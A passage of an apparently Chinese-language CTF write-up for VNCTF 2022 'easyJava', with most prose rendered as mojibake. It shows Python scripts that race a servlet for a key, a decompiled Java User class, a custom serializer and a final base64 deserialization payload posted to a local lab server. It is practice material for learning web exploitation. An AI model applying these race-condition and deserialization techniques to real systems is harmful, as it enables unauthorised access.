·éƒ½ä¸å¯èƒ½è¿›elseçš„ã€‚å¼€å§‹æ€è€ƒæœ‰æ²¡æœ‰åˆ«çš„åŠæ³•ã€‚æŸ¥é˜…äº†ä¸€äº›èµ„æ–™é—®é«˜è¡¨å“¥ä¹‹åå‘ç°è¿™é‡Œéœ€è¦æ¡ä»¶ç«äº‰ã€‚è‡³äºä¸ºä»€ä¹ˆå¯ä»¥ç«äº‰ï¼ŒäºŒå¸ˆå‚…çš„çŒœæµ‹åŠ ä¸Šæˆ‘çš„ç†è§£å†åŠ ä¸Šy4å¸ˆå‚…çš„æ€»ç»“ï¼Œå¤§æ¦‚å°±æ˜¯servletåœ¨ä¸€æ®µæ—¶é—´å†…åªå®ä¾‹åŒ–ä¸€æ¬¡ï¼Œå¯¼è‡´å¤šä¸ªç”¨æˆ·ä¼šåŒæ—¶è®¿é—®åˆ°åŒä¸€ä¸ªå®ä¾‹ï¼Œæ‰€ä»¥æŠ¢åœ¨æŸä¸ªservletå®ä¾‹é”€æ¯ä¹‹å‰å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œå°±å¯ä»¥å®ç°ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³çš„æƒ…å†µï¼Œè¿›è€Œæ‹¿åˆ°è¿™ä¸ªkeyã€‚\nimage-20220303215240491\ré™„ä¸Šå†™å¥½çš„åƒåœ¾è„šæœ¬ã€‚\na.py\nimport requests\rhost = \u0026quot;http://localhost:8080/evi1\u0026quot;\rwhile True:\rr = requests.get(host+\u0026quot;?name=qertyyui\u0026quot;)\rb.py\nimport requests\rhost = \u0026quot;http://localhost:8080/evi1\u0026quot;\rwhile True:\rr = requests.get(host+\u0026quot;?name=vnctf2022\u0026quot;)\rif r.text.find(\u0026quot;The Key is\u0026quot;)!=-1:\rprint(r.text)\ræ‹¿åˆ°keyã€‚\nè¿™é‡Œåœ¨ç¬¬äºŒæ¬¡å¤ç°çš„æ—¶å€™å‡ºäº†ä¸€ç‚¹é—®é¢˜ã€‚é—®é¢˜å¤§æ¦‚å‡ºåœ¨pythonçš„requestï¼Œåœ¨å‘èµ·è¯·æ±‚ä¹‹åä¸ä¼šè‡ªåŠ¨å…³é—­è¿æ¥ï¼Œå¦‚æœçŸ­æ—¶é—´å†…å‘èµ·è¯·æ±‚è¿‡å¤šçš„è¯ä¼šä¸€ç›´å ç”¨Httpconnnectionpoolçš„èµ„æºï¼Œå¯¼è‡´ä¹‹åå‘èµ·çš„è¯·æ±‚æ²¡æœ‰åŠæ³•æˆåŠŸè¿æ¥ã€‚å°è¯•äº†å¾ˆå¤šåŠæ³•éƒ½æ²¡æœ‰ç»“å±€ï¼Œä¸è®ºæ˜¯åŠ headerçš„connectionä¸ºcloseï¼Œè¿˜æ˜¯æ§åˆ¶sessionï¼Œéƒ½æ²¡æœ‰ç”¨ã€‚æœ€åé‡‡ç”¨å¤šçº¿ç¨‹çš„åŠæ³•æ‰è§£å†³ã€‚ æ¥ç€å¾€ä¸‹å°±æ˜¯ååºåˆ—åŒ–ï¼Œè¿™é‡Œéœ€è¦postä¸€ä¸ªkeyå’Œbase64ï¼Œå…¶ä¸­base64æ˜¯ä¸€ä¸ªUserç±»åºåˆ—åŒ–ä¹‹åç»è¿‡base64ç¼–ç çš„ç»“æœã€‚SerAndDeç±»é‡Œé¢æä¾›äº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ–¹æ³•å°è£…ï¼Œå¯ä»¥ç›´æ¥æ‹¿æ¥ç”¨ã€‚\nimage-20220303220931037\ræ³¨æ„åˆ°è¿™é‡Œçš„this.userï¼Œæˆ‘ä»¬ååºåˆ—åŒ–å‡ºæ¥çš„Useréœ€è¦å’Œthis.userç›¸ç­‰ã€‚\nimage-20220304093202982\ré‚£ä¹ˆè¿›Userç±»çœ‹çœ‹ã€‚\npackage entity;\rimport java.io.IOException;\rimport java.io.ObjectInputStream;\rimport java.io.Serializable;\r/* loaded from: User.class */\rpublic class User implements Serializable {\rprivate String name;\rprivate String age;\rprivate transient String height;\rpublic User(String name, String age, String height) {\rthis.name = name;\rthis.age = age;\rthis.height = height;\r}\rpublic String getName() {\rreturn this.name;\r}\rpublic void setName(String name) {\rthis.name = name;\r}\rpublic String getAge() {\rreturn this.age;\r}\rpublic void setAge(String age) {\rthis.age = age;\r}\rpublic String getHeight() {\rreturn this.height;\r}\rpublic void setHeight(String height) {\rthis.height = height;\r}\rprivate void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {\rs.defaultReadObject();\rthis.height = (String) s.readObject();\r}\r@Override // java.lang.Object\rpublic boolean equals(Object obj) {\rif (obj == null) {\rreturn false;\r}\rif (this == obj) {\rreturn true;\r}\rif (!(obj instanceof User)) {\rreturn false;\r}\rUser user = (User) obj;\rif (!user.getAge().equals(this.age) || !user.getHeight().equals(this.height) || !user.getName().equals(this.name)) {\rreturn false;\r}\rreturn true;\r}\r@Override // java.lang.Object\rpublic String toString() {\rreturn \u0026quot;User{name='\u0026quot; + this.name + \u0026quot;', age='\u0026quot; + this.age + \u0026quot;', height='\u0026quot; + this.height + \u0026quot;'}\u0026quot;;\r}\r}\rè¿™é‡Œæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå¯¹äºåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œè¢«transientä¿®é¥°çš„å˜é‡æ˜¯ä¸ä¼šè¢«åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥å¦‚æœä¸ä½œä»»ä½•æ›´æ”¹åºåˆ—åŒ–å‡ºæ¥çš„å­—ç¬¦ä¸²å†æ‹¿å»ååºåˆ—åŒ–ï¼Œå¾—åˆ°çš„heightä¼šæ˜¯ä¸ªnullï¼Œè¿™æ ·å°±æ²¡æœ‰åŠæ³•æ»¡è¶³ifæ¡ä»¶ï¼Œæ‹¿ä¸åˆ°flagã€‚æ‰€ä»¥ä¸ºäº†ååºåˆ—åŒ–å‡ºæ¥æ—¶ï¼Œè¿™ä¸ªheightå’Œthis.useré‡Œé¢çš„heightæ˜¯ä¸€è‡´çš„ï¼Œå¯ä»¥é€šè¿‡é‡å†™writeObjectæ–¹æ³•ï¼Œæ‰‹åŠ¨æŠŠheightå†™è¿›æˆ‘ä»¬ååºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡é‡Œã€‚\nimage-20220304094934553\rè¿™é‡Œåˆæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åœ¨Userç±»é‡Œé¢é‡å†™äº†readObjectï¼Œè¿™ä¸€è¡Œä»£ç å­˜åœ¨çš„æ—¶å€™ï¼Œååºåˆ—åŒ–ä¸€å®šä¼šå¤±è´¥ï¼Œä½†æ˜¯æ³¨é‡Šæ‰ä¹‹åæ˜¯å¯ä»¥çœ‹åˆ°heightä¸ºnullçš„ã€‚\nthis.height = (String) s.readObject();\råœ¨Userç±»é‡Œé¢é‡å†™ä¸€ä¸ªwriteObject\nprivate void writeObject(ObjectOutputStream s) throws IOException{\rs.defaultWriteObject();\rs.writeObject(\u0026quot;180\u0026quot;);\r}\rè¿™æ ·å°±å¯ä»¥æˆåŠŸè¿›å…¥ifåˆ¤æ–­ï¼Œæ‹¿åˆ°flagã€‚\nè‡ªå·±å†™ä¸€ä¸ªserializeç±»ï¼Œè¾“å‡ºéœ€è¦çš„base64å­—ç¬¦ä¸²ï¼ŒåŒæ—¶æŸ¥çœ‹ä¸€ä¸‹user2çš„å±æ€§æƒ…å†µã€‚\nimport java.io.*;\rimport java.util.Base64;\rimport entity.User;\rimport util.SerAndDe;\rpublic class serialize {\rpublic static void main(String[] args) throws IOException, ClassNotFoundException {\rUser u = new User(\u0026quot;m4n_q1u_666\u0026quot;,\u0026quot;666\u0026quot;,\u0026quot;180\u0026quot;);\rbyte[] user = SerAndDe.serialize(u);\rString poc = Base64.getEncoder().encodeToString(user);\rSystem.out.println(poc);\rbyte[] user2 = Base64.getDecoder().decode(poc);\rSystem.out.println(SerAndDe.deserialize(user2).toString());\r}\r}\rç»“æœå¦‚ä¸‹\nimage-20220304100044543\ræœ¬åœ°æ²¡æœ‰flagï¼Œå‚è€ƒle1aå¸ˆå‚…çš„å¤ç°è¿‡ç¨‹ï¼Œåœ¨æœ¬åœ°å¼¹ä¸ªè®¡ç®—å™¨ã€‚\nimage-20220304100736444\rpayload\nhttp://127.0.0.1:8080/evi1\rpost:key=SjveAUeJxYXPww2Dd0NPwUm90na98of1\u0026amp;base64=rO0ABXNyAAtlbnRpdHkuVXNlcm1aqowD0DcIAwACTAADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABeHB0AAM2NjZ0AAttNG5fcTF1XzY2NnQAAzE4MHg=\rå¤§åŠŸå‘Šæˆï¼\nimage-20220304101021208\rä¸€äº›å¥‡æ€ªçš„å§¿åŠ¿ ä¹‹å‰æ²¡æœ‰æ­è¿‡tomcatï¼Œæ‰€ä»¥åœ¨æ­å»ºç¯å¢ƒçš„è¿‡ç¨‹ä¸­æœ‰äº›åƒåŠ›ã€‚å®Œæ•´çš„æ­å»ºè¿‡ç¨‹ä¹‹åæœ‰ç©ºäº†åœ¨æå­ï¼Œè¿™é‡Œç”¨çš„åŠæ³•æ˜¯ç”¨ç¼–è¯‘å¥½çš„æ–‡ä»¶æ›¿æ¢æ‰tomcatè‡ªå¸¦çš„ROOTã€‚\nimage-20220302132904237\råœ¨åšçš„è¿‡ç¨‹ä¸­å‘ç°ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªåŠæ³•éª—è¿‡ç¼–è¯‘å™¨ï¼Œå½“ç„¶å‰ææ˜¯éœ€è¦çŸ¥é“ç±»é‡Œæœ‰å“ªäº›æ–¹æ³•ï¼Œå¦åˆ™ä¼šå‡ºç°æ‰¾ä¸åˆ°è°ƒç”¨çš„æ–¹æ³•ä¹‹ç±»çš„é”™è¯¯ã€‚\nå‚è€ƒèµ„æ–™ Le1aå¸ˆå‚…çš„wp\nVNCTF 2022 Official WriteUp\njava-Transientå…³é”®å­—ã€Volatileå…³é”®å­—ä»‹ç»å’Œåºåˆ—åŒ–ã€ååºåˆ—åŒ–æœºåˆ¶ã€å•ä¾‹ç±»åºåˆ—åŒ–\nServletçš„çº¿ç¨‹å®‰å…¨é—®é¢˜\nå†™åœ¨åé¢ è¿™æ˜¯ä¸çŸ¥é“éš”äº†å¤šä¹…ä¹‹åé‡æ–°å¼€å§‹æ‰“æ¯”èµ›ï¼Œå¹¶ä¸”è®¤è®¤çœŸçœŸåœ°å¤ç°ã€‚è™½ç„¶æ¯”èµ›è¿‡ç¨‹ä¸­æ²¡æœ‰åšå‡ºæ¥ï¼Œä½†æ˜¯æˆå°±æ„Ÿæ»¡æ»¡ï¼Œä¹Ÿå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ã€‚ä½œä¸ºä¸€åä¸åˆæ ¼çš„webæ‰‹ï¼Œåªèƒ½æœŸæœ›æ—¥åå¤špushè‡ªå·±ä¸€ä¸‹ï¼Œå¥½å¥½æ‰“æ¯”èµ›å¥½å¥½å†™é¢˜ï¼Œæœ€é‡è¦çš„æ˜¯è¡¨å“¥ä»¬å¸¦å¸¦æˆ‘(â—\u0026rsquo;â—¡\u0026rsquo;â—)\n","date":"2022-03-04T00:00:00Z","permalink":"https://example.com/2022/vnctf2022-easyjava/","title":"VNctf2022-easyJava"}]